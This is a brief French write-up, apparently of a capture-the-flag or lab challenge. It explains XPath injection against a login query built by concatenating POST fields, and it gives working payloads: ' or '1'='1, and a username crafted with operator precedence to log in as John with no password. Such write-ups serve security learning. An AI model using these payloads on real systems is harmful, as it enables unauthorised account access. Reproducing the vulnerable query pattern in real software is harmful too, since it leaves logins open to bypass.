L’authentification basique réalisée ici est de la forme suivante :
```
//user[username='" .$_POST['username']."' and password='".$_POST['password']."']
```
Un simple
```
username=a
password=' or '1'='1
```
nous donne une connexion en tant que Steve. Puisque nous voulons être connecté en tant que John, on veut omettre la vérification du password.
On procède alors en utilisant les priorités entre les opérateurs or et and. Similairement aux mathématiques :
```
 Maths : a + b * c <=> a + (b * c)
 XPath Logic : a or b and c <=> a or (b and c)
```
Ainsi il suffit de créer la requête suivante :
```
//user[username='John' or '1'='1' and password='']
```
La condition ’1’=’1’ and password=’’ valant toujours false, la condition globale ne serait vraie que lorsque l’username sera John.

Donc il suffit d’entrer ces valeurs dans le formulaire :
```
username=John' or '1'='1
password=
```
